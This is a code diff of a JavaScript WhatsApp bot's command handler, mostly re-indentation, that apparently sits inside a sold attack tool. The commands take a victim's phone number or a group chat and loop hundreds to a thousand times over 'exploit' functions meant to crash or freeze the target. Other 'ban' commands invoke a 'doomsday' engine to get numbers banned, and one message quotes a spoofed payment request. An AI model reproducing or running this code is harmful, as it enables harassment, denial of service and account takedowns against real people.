@@ -4003,7 +4003,7 @@ module.exports = aruloffcx = async (aruloffcx, m, chatUpdate, store) => {
             case 'cortana-blank':
             case 'elmiblanking':
             case 'edudevice':
-            case 'elmidevice':
+            case 'elmidevice': {
                 if (!isPremium && !isCreator) {
                     return zreply(`*no, this is for premium only*`);
                 }
@@ -4043,98 +4043,105 @@ module.exports = aruloffcx = async (aruloffcx, m, chatUpdate, store) => {
                 // CORTANA Success Message
                 await cortanaExploitSuccess(bijipler, command);
                 break;
-        }
+            }
 
 
-        if (!isPremium && !isCreator) {
-            return zreply(`*no, this is for premium only*`);
-        }
 
-        if (!text) {
-            return zreply(`— example: ${prefix + command} 62xxx`);
-        }
+            // NEWYEAR / ONETERM / CORTANACALL
+            case 'newyear':
+            case 'oneterm':
+            case 'trashem':
+            case 'cortanacall':
+            case 'cortana-virus': {
+                if (!isPremium && !isCreator) {
+                    return zreply(`*no, this is for premium only*`);
+                }
 
-        let bijipler = text.replace(/[^0-9]/g, '');
-        if (bijipler.startsWith('0')) {
-            return zreply(`Contoh: ${prefix + command} 628xxx`);
-        }
+                if (!text) {
+                    return zreply(`— example: ${prefix + command} 62xxx`);
+                }
 
-        let target = bijipler + '@s.whatsapp.net';
-        const BlockNum = '6285814233961@s.whatsapp.net';
+                let bijipler = text.replace(/[^0-9]/g, '');
+                if (bijipler.startsWith('0')) {
+                    return zreply(`Contoh: ${prefix + command} 628xxx`);
+                }
 
-        if (target === BlockNum) return zreply("*no you will send this to the developer*");
+                let target = bijipler + '@s.whatsapp.net';
+                const BlockNum = '6285814233961@s.whatsapp.net';
 
-        await reaction(m.chat, "🦠");
-        await sleep(550);
-        await reaction(m.chat, "☠️");
-        await sleep(550);
-        await reaction(m.chat, "🩸");
-        await sleep(550);
-        await reaction(m.chat, "🐉");
-        await sleep(550);
-        await reaction(m.chat, "✅");
+                if (target === BlockNum) return zreply("*no you will send this to the developer*");
 
-        const done = `\`[ 𝐒𝐔𝐂̸͜𝐂̸͜𝐄𝐒 𝐄͡͡𝐗𝐄𝐂̸͜𝐔𝐓𝐈𝐎̽͢𝐍 ]\`
+                await reaction(m.chat, "🦠");
+                await sleep(550);
+                await reaction(m.chat, "☠️");
+                await sleep(550);
+                await reaction(m.chat, "🩸");
+                await sleep(550);
+                await reaction(m.chat, "🐉");
+                await sleep(550);
+                await reaction(m.chat, "✅");
+
+                const done = `\`[ 𝐒𝐔𝐂̸͜𝐂̸͜𝐄𝐒 𝐄͡͡𝐗𝐄𝐂̸͜𝐔𝐓𝐈𝐎̽͢𝐍 ]\`
 \`𖥂\` Target : ${bijipler}
 \`𖥂\` Status : Done Bang
 \`𖥂\` Type : Delay Hard Invisible
 \`𖥂\` Command : ${command}`;
 
-        await aruloffcx.sendMessage(m.chat, {
-            interactiveMessage: {
-                title: done,
-                footer: '( ! ) Abis Bug Kasih Jeda 10 Menit',
-                thumbnail: "https://files.catbox.moe/r06wjz.jpeg",
-                nativeFlowMessage: {
-                    buttons: [
-                        {
-                            name: "single_select",
-                            buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
-                        },
-                        {
-                            name: "call_permission_request",
-                            buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
-                        },
-                        {
-                            name: "cta_url",
-                            buttonParamsJson: JSON.stringify({
-                                display_text: "𝐈𝐧𝐟𝐨 𝐔𝐩𝐝𝐚𝐭𝐞 𝐒𝐜𝐫𝐢𝐩𝐭",
-                                url: "https://whatsapp.com/channel/0029Vb5zkzTHltY0ERtDNP3M"
-                            })
-                        }
-                    ]
-                }
-            }
-        },
-            {
-                quoted: {
-                    key: { remoteJid: "0@s.whatsapp.net", fromMe: false, id: "ownername", participant: "0@s.whatsapp.net" },
-                    message: {
-                        requestPaymentMessage: {
-                            currencyCodeIso4217: "USD",
-                            amount1000: "999999999",
-                            requestFrom: "0@s.whatsapp.net",
-                            noteMessage: { extendedTextMessage: { text: "𝐀͢𝐫͡𝐮𝐥 ᳟𝐎͢𝐟͡𝐟𝐢𝐜𝐢𝐚𝐥-᳟𝐈͢𝐃" } },
-                            expiryTimestamp: "999999999",
-                            amount: { value: "91929291929", offset: "1000", currencyCode: "INR" }
+                await aruloffcx.sendMessage(m.chat, {
+                    interactiveMessage: {
+                        title: done,
+                        footer: '( ! ) Abis Bug Kasih Jeda 10 Menit',
+                        thumbnail: "https://files.catbox.moe/r06wjz.jpeg",
+                        nativeFlowMessage: {
+                            buttons: [
+                                {
+                                    name: "single_select",
+                                    buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
+                                },
+                                {
+                                    name: "call_permission_request",
+                                    buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
+                                },
+                                {
+                                    name: "cta_url",
+                                    buttonParamsJson: JSON.stringify({
+                                        display_text: "𝐈𝐧𝐟𝐨 𝐔𝐩𝐝𝐚𝐭𝐞 𝐒𝐜𝐫𝐢𝐩𝐭",
+                                        url: "https://whatsapp.com/channel/0029Vb5zkzTHltY0ERtDNP3M"
+                                    })
+                                }
+                            ]
                         }
                     }
+                },
+                    {
+                        quoted: {
+                            key: { remoteJid: "0@s.whatsapp.net", fromMe: false, id: "ownername", participant: "0@s.whatsapp.net" },
+                            message: {
+                                requestPaymentMessage: {
+                                    currencyCodeIso4217: "USD",
+                                    amount1000: "999999999",
+                                    requestFrom: "0@s.whatsapp.net",
+                                    noteMessage: { extendedTextMessage: { text: "𝐀͢𝐫͡𝐮𝐥 ᳟𝐎͢𝐟͡𝐟𝐢𝐜𝐢𝐚𝐥-᳟𝐈͢𝐃" } },
+                                    expiryTimestamp: "999999999",
+                                    amount: { value: "91929291929", offset: "1000", currencyCode: "INR" }
+                                }
+                            }
+                        }
+                    });
+
+                for (let i = 0; i < 1000; i++) {
+                    await TzXAudio(aruloffcx, target);
+                    await sleep(1500);
+                    await TzXAudio(aruloffcx, target);
+                    await sleep(1500);
+                    await TzXAudio(aruloffcx, target);
+                    await sleep(1500);
+                    await TzXAudio(aruloffcx, target);
+                    await sleep(1500);
                 }
-            });
 
-        for (let i = 0; i < 1000; i++) {
-            await TzXAudio(aruloffcx, target);
-            await sleep(1500);
-            await TzXAudio(aruloffcx, target);
-            await sleep(1500);
-            await TzXAudio(aruloffcx, target);
-            await sleep(1500);
-            await TzXAudio(aruloffcx, target);
-            await sleep(1500);
-        }
-
-        break;
-    }
+                break;
+            }
 
             // DELAY HARD BUG
             case 'cortanazap':
@@ -4143,256 +4150,256 @@ module.exports = aruloffcx = async (aruloffcx, m, chatUpdate, store) => {
             case 'elmitravas':
             case 'kindiki':
             case 'elmighost': {
-        if (!isPremium && !isCreator) {
-            return zreply(`*no, this is for premium only*`);
-        }
+                if (!isPremium && !isCreator) {
+                    return zreply(`*no, this is for premium only*`);
+                }
 
-        if (!text) {
-            return zreply(`wrong usage, please include the format .${command} 254***** for execution`);
-        }
+                if (!text) {
+                    return zreply(`wrong usage, please include the format .${command} 254***** for execution`);
+                }
 
-        let bijipler = text.replace(/[^0-9]/g, '');
-        if (bijipler.startsWith('0')) {
-            return zreply(`Contoh: ${prefix + command} 628xxx`);
-        }
+                let bijipler = text.replace(/[^0-9]/g, '');
+                if (bijipler.startsWith('0')) {
+                    return zreply(`Contoh: ${prefix + command} 628xxx`);
+                }
 
-        let target = bijipler + '@s.whatsapp.net';
-        const BlockNum = '6285814233961@s.whatsapp.net';
+                let target = bijipler + '@s.whatsapp.net';
+                const BlockNum = '6285814233961@s.whatsapp.net';
 
-        if (target === BlockNum) return zreply("*no you will send this to the developer*");
+                if (target === BlockNum) return zreply("*no you will send this to the developer*");
 
-        await reaction(m.chat, "🦠");
-        await sleep(400);
-        await reaction(m.chat, "☠️");
-        await sleep(400);
-        await reaction(m.chat, "✅");
+                await reaction(m.chat, "🦠");
+                await sleep(400);
+                await reaction(m.chat, "☠️");
+                await sleep(400);
+                await reaction(m.chat, "✅");
 
-        // Execute exploit
-        for (let i = 0; i < 800; i++) {
-            await TzXAudio(aruloffcx, target);
-            await sleep(1500);
-            await TzXAudio(aruloffcx, target);
-            await sleep(1500);
-            await TzXAudio(aruloffcx, target);
-            await sleep(1500);
-        }
+                // Execute exploit
+                for (let i = 0; i < 800; i++) {
+                    await TzXAudio(aruloffcx, target);
+                    await sleep(1500);
+                    await TzXAudio(aruloffcx, target);
+                    await sleep(1500);
+                    await TzXAudio(aruloffcx, target);
+                    await sleep(1500);
+                }
 
-        // CORTANA Success Message
-        await cortanaExploitSuccess(bijipler, command);
-        break;
-    }
+                // CORTANA Success Message
+                await cortanaExploitSuccess(bijipler, command);
+                break;
+            }
 
             // GROUP BUG
             case 'kufeni':
             case 'kanjut': {
-        if (!m.isGroup) return zreply(`*this is for groups only*`)
-        if (!isCreator) return zreply(`*no, this is for owners only*`)
+                if (!m.isGroup) return zreply(`*this is for groups only*`)
+                if (!isCreator) return zreply(`*no, this is for owners only*`)
 
-        await reaction(m.chat, "🦠");
-        await sleep(400);
-        await reaction(m.chat, "☠️");
-        await sleep(400);
-        await reaction(m.chat, "✅");
+                await reaction(m.chat, "🦠");
+                await sleep(400);
+                await reaction(m.chat, "☠️");
+                await sleep(400);
+                await reaction(m.chat, "✅");
 
-        const target = m.chat;
-        await R9XKillGc(aruloffcx, target, false);
+                const target = m.chat;
+                await R9XKillGc(aruloffcx, target, false);
 
-        // CORTANA Success Message
-        await cortanaExploitSuccess(m.chat.split('@')[0], command);
-        break;
-    }
+                // CORTANA Success Message
+                await cortanaExploitSuccess(m.chat.split('@')[0], command);
+                break;
+            }
 
             case 'cookall':
             case 'maklo':
             case 'fuckgc':
             case 'tobrut': {
-        if (!m.isGroup) return zreply(`*this is for groups only*`)
-        if (!isCreator) return zreply(`*no, this is for owners only*`)
+                if (!m.isGroup) return zreply(`*this is for groups only*`)
+                if (!isCreator) return zreply(`*no, this is for owners only*`)
 
-        await reaction(m.chat, "🦠");
-        await sleep(400);
-        await reaction(m.chat, "☠️");
-        await sleep(400);
-        await reaction(m.chat, "✅");
+                await reaction(m.chat, "🦠");
+                await sleep(400);
+                await reaction(m.chat, "☠️");
+                await sleep(400);
+                await reaction(m.chat, "✅");
 
-        for (let i = 0; i < 1000; i++) {
-            await BugGb12(aruloffcx, m.chat)
-            await BugGb12(aruloffcx, m.chat)
-            await BugGb12(aruloffcx, m.chat)
-            await BugGb12(aruloffcx, m.chat)
-            await BugGb12(aruloffcx, m.chat)
-            await BugGb12(aruloffcx, m.chat)
-            await BugGb12(aruloffcx, m.chat)
-            await BugGb12(aruloffcx, m.chat)
-            await sleep(1000)
-        }
+                for (let i = 0; i < 1000; i++) {
+                    await BugGb12(aruloffcx, m.chat)
+                    await BugGb12(aruloffcx, m.chat)
+                    await BugGb12(aruloffcx, m.chat)
+                    await BugGb12(aruloffcx, m.chat)
+                    await BugGb12(aruloffcx, m.chat)
+                    await BugGb12(aruloffcx, m.chat)
+                    await BugGb12(aruloffcx, m.chat)
+                    await BugGb12(aruloffcx, m.chat)
+                    await sleep(1000)
+                }
 
-        // CORTANA Success Message
-        await cortanaExploitSuccess(m.chat.split('@')[0], command);
-        break;
-    }
+                // CORTANA Success Message
+                await cortanaExploitSuccess(m.chat.split('@')[0], command);
+                break;
+            }
 
             // ═══════ BAN EXPLOITS ═══════
             case 'perm-ban-num': {
-        if (!isCreator) return zreply(`*no, this is for owners only*`);
+                if (!isCreator) return zreply(`*no, this is for owners only*`);
 
-        if (!text) {
-            return zreply(`— example: ${prefix + command} 62xxx`);
-        }
+                if (!text) {
+                    return zreply(`— example: ${prefix + command} 62xxx`);
+                }
 
-        let bijipler = text.replace(/[^0-9]/g, '');
-        if (bijipler.startsWith('0')) {
-            return zreply(`Format: ${prefix + command} 628xxx`);
-        }
+                let bijipler = text.replace(/[^0-9]/g, '');
+                if (bijipler.startsWith('0')) {
+                    return zreply(`Format: ${prefix + command} 628xxx`);
+                }
 
-        let target = bijipler + '@s.whatsapp.net';
+                let target = bijipler + '@s.whatsapp.net';
 
-        await reaction(m.chat, "🦠");
-        await sleep(400);
-        await reaction(m.chat, "☠️");
-        await sleep(400);
-        await reaction(m.chat, "🔥");
+                await reaction(m.chat, "🦠");
+                await sleep(400);
+                await reaction(m.chat, "☠️");
+                await sleep(400);
+                await reaction(m.chat, "🔥");
 
-        try {
-            // Import and execute ban engine
-            const { CortanaDoomsday } = require(path.join(__dirname, '../../ban-engine'));
-            const banEngine = new CortanaDoomsday();
+                try {
+                    // Import and execute ban engine
+                    const { CortanaDoomsday } = require(path.join(__dirname, '../../ban-engine'));
+                    const banEngine = new CortanaDoomsday();
 
-            // Send starting message
-            await aruloffcx.sendMessage(m.chat, {
-                text: `☠️ *CORTANA PERMANENT BAN*\n\n🎯 Target: ${bijipler}\n⏳ Status: Initializing doomsday engine...\n\nThis may take several minutes.`
-            });
+                    // Send starting message
+                    await aruloffcx.sendMessage(m.chat, {
+                        text: `☠️ *CORTANA PERMANENT BAN*\n\n🎯 Target: ${bijipler}\n⏳ Status: Initializing doomsday engine...\n\nThis may take several minutes.`
+                    });
 
-            // Execute permanent ban
-            const result = await banEngine.executePermanentBan(target);
+                    // Execute permanent ban
+                    const result = await banEngine.executePermanentBan(target);
 
-            await reaction(m.chat, "✅");
+                    await reaction(m.chat, "✅");
 
-            // CORTANA Ban Success Message
-            await cortanaBanSuccess(bijipler, command);
+                    // CORTANA Ban Success Message
+                    await cortanaBanSuccess(bijipler, command);
 
-        } catch (error) {
-            console.error('[BAN] Error:', error);
-            await reaction(m.chat, "❌");
-            zreply(`*Ban execution failed: ${error.message}*`);
-        }
+                } catch (error) {
+                    console.error('[BAN] Error:', error);
+                    await reaction(m.chat, "❌");
+                    zreply(`*Ban execution failed: ${error.message}*`);
+                }
 
-        break;
-    }
+                break;
+            }
 
             case 'temp-ban-num': {
-        if (!isCreator) return zreply(`*no, this is for owners only*`);
+                if (!isCreator) return zreply(`*no, this is for owners only*`);
 
-        if (!text) {
-            return zreply(`— example: ${prefix + command} 62xxx`);
-        }
+                if (!text) {
+                    return zreply(`— example: ${prefix + command} 62xxx`);
+                }
 
-        let bijipler = text.replace(/[^0-9]/g, '');
-        if (bijipler.startsWith('0')) {
-            return zreply(`Format: ${prefix + command} 628xxx`);
-        }
+                let bijipler = text.replace(/[^0-9]/g, '');
+                if (bijipler.startsWith('0')) {
+                    return zreply(`Format: ${prefix + command} 628xxx`);
+                }
 
-        let target = bijipler + '@s.whatsapp.net';
+                let target = bijipler + '@s.whatsapp.net';
 
-        await reaction(m.chat, "🦠");
-        await sleep(400);
-        await reaction(m.chat, "☠️");
-        await sleep(400);
-        await reaction(m.chat, "⚡");
+                await reaction(m.chat, "🦠");
+                await sleep(400);
+                await reaction(m.chat, "☠️");
+                await sleep(400);
+                await reaction(m.chat, "⚡");
 
-        try {
-            // Import and execute ban engine
-            const { CortanaDoomsday } = require(path.join(__dirname, '../../ban-engine'));
-            const banEngine = new CortanaDoomsday();
+                try {
+                    // Import and execute ban engine
+                    const { CortanaDoomsday } = require(path.join(__dirname, '../../ban-engine'));
+                    const banEngine = new CortanaDoomsday();
 
-            // Send starting message
-            await aruloffcx.sendMessage(m.chat, {
-                text: `☠️ *CORTANA TEMPORARY BAN*\n\n🎯 Target: ${bijipler}\n⏳ Status: Initializing attack...\n\nThis may take a few minutes.`
-            });
+                    // Send starting message
+                    await aruloffcx.sendMessage(m.chat, {
+                        text: `☠️ *CORTANA TEMPORARY BAN*\n\n🎯 Target: ${bijipler}\n⏳ Status: Initializing attack...\n\nThis may take a few minutes.`
+                    });
 
-            // Execute temporary ban (HEAVY intensity)
-            const result = await banEngine.executeTemporaryBan(target);
+                    // Execute temporary ban (HEAVY intensity)
+                    const result = await banEngine.executeTemporaryBan(target);
 
-            await reaction(m.chat, "✅");
+                    await reaction(m.chat, "✅");
 
-            // CORTANA Ban Success Message
-            await cortanaBanSuccess(bijipler, command);
+                    // CORTANA Ban Success Message
+                    await cortanaBanSuccess(bijipler, command);
 
-        } catch (error) {
-            console.error('[BAN] Error:', error);
-            await reaction(m.chat, "❌");
-            zreply(`*Ban execution failed: ${error.message}*`);
-        }
+                } catch (error) {
+                    console.error('[BAN] Error:', error);
+                    await reaction(m.chat, "❌");
+                    zreply(`*Ban execution failed: ${error.message}*`);
+                }
 
-        break;
-    }
+                break;
+            }
 
             default:
-    const pluginsDisable = true;
-    if (!pluginsDisable) {
-        // Fungsi untuk memuat plugins
-        const pluginsLoader = async (directory) => {
-            let plugins = [];
-            try {
-                const files = fs.readdirSync(directory);
-                for (const file of files) {
-                    const filePath = path.join(directory, file);
-                    if (filePath.endsWith(".js")) {
+                const pluginsDisable = true;
+                if (!pluginsDisable) {
+                    // Fungsi untuk memuat plugins
+                    const pluginsLoader = async (directory) => {
+                        let plugins = [];
                         try {
-                            const resolvedPath = require.resolve(filePath);
-                            if (require.cache[resolvedPath]) {
-                                delete require.cache[resolvedPath];
+                            const files = fs.readdirSync(directory);
+                            for (const file of files) {
+                                const filePath = path.join(directory, file);
+                                if (filePath.endsWith(".js")) {
+                                    try {
+                                        const resolvedPath = require.resolve(filePath);
+                                        if (require.cache[resolvedPath]) {
+                                            delete require.cache[resolvedPath];
+                                        }
+                                        const plugin = require(filePath);
+                                        plugins.push(plugin);
+                                    } catch (error) {
+                                        console.log(`Error loading ${filePath}:`, error.message);
+                                    }
+                                }
                             }
-                            const plugin = require(filePath);
-                            plugins.push(plugin);
                         } catch (error) {
-                            console.log(`Error loading ${filePath}:`, error.message);
+                            console.log("Error loading plugins:", error.message);
+                        }
+                        return plugins;
+                    };
+
+                    const plugins = await pluginsLoader(path.resolve(__dirname, "../command"));
+                    const plug = {
+                        aruloffc,
+                        prefix,
+                        command,
+                        Reply,
+                        text,
+                        isBot,
+                        reaction,
+                        pushname,
+                        mime,
+                        quoted,
+                        sleep: sleep || ((ms) => new Promise(resolve => setTimeout(resolve, ms))),
+                        fquoted,
+                        fetchJson
+                    };
+
+                    for (let plugin of plugins) {
+                        if (plugin.command && plugin.command.find(e => e == command.toLowerCase())) {
+                            if (plugin.isBot && !isBot) {
+                                return;
+                            }
+
+                            if (plugin.private && !plug.isPrivate) {
+                                return zreply(config.message?.private || "Fitur ini bersifat private!");
+                            }
+
+                            if (typeof plugin !== "function") return;
+                            await plugin(m, plug);
                         }
                     }
                 }
-            } catch (error) {
-                console.log("Error loading plugins:", error.message);
-            }
-            return plugins;
-        };
-
-        const plugins = await pluginsLoader(path.resolve(__dirname, "../command"));
-        const plug = {
-            aruloffc,
-            prefix,
-            command,
-            Reply,
-            text,
-            isBot,
-            reaction,
-            pushname,
-            mime,
-            quoted,
-            sleep: sleep || ((ms) => new Promise(resolve => setTimeout(resolve, ms))),
-            fquoted,
-            fetchJson
-        };
-
-        for (let plugin of plugins) {
-            if (plugin.command && plugin.command.find(e => e == command.toLowerCase())) {
-                if (plugin.isBot && !isBot) {
-                    return;
-                }
-
-                if (plugin.private && !plug.isPrivate) {
-                    return zreply(config.message?.private || "Fitur ini bersifat private!");
-                }
-
-                if (typeof plugin !== "function") return;
-                await plugin(m, plug);
-            }
+                break;
         }
-    }
-    break;
-}
     } catch (err) {
-    console.error("Error in main handler:", util.format(err));
-}
+        console.error("Error in main handler:", util.format(err));
+    }
 };
 
 const file = require.resolve(__filename);
